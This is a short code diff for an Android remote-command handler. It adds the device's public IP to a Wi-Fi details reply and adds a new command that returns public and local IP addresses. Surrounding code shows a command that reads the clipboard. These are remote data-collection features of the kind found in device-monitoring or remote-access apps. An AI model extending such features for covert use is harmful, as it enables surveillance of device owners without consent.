@@ -332,7 +332,13 @@ class RemoteCommandManager(private val context: Context) {
                 }
                 "GET_WIFI_DETAILS", "WIFI", "WIFI_DETAILS" -> {
                     val info = DeviceInfoSyncManager(context).collectAndSyncDeviceInfo()
-                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}"
+                    resultMessage = "Wi-Fi SSID: ${info.wifiSsid}, BSSID: ${info.wifiBssid}, RSSI: ${info.wifiRssi}dBm, Local IP: ${info.localIp}, Public IP: ${info.publicIp}"
+                }
+                "GET_PUBLIC_IP", "PUBLIC_IP", "GET_IP", "IP_ADDRESS", "PUBLIC_IP_ADDRESS" -> {
+                    val syncMgr = DeviceInfoSyncManager(context)
+                    val publicIp = syncMgr.fetchPublicIpAddress()
+                    val localIp = syncMgr.getLocalIpAddress()
+                    resultMessage = "Public IP: $publicIp, Local IP: $localIp"
                 }
                 "GET_CLIPBOARD", "CLIPBOARD" -> {
                     val clipManager = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
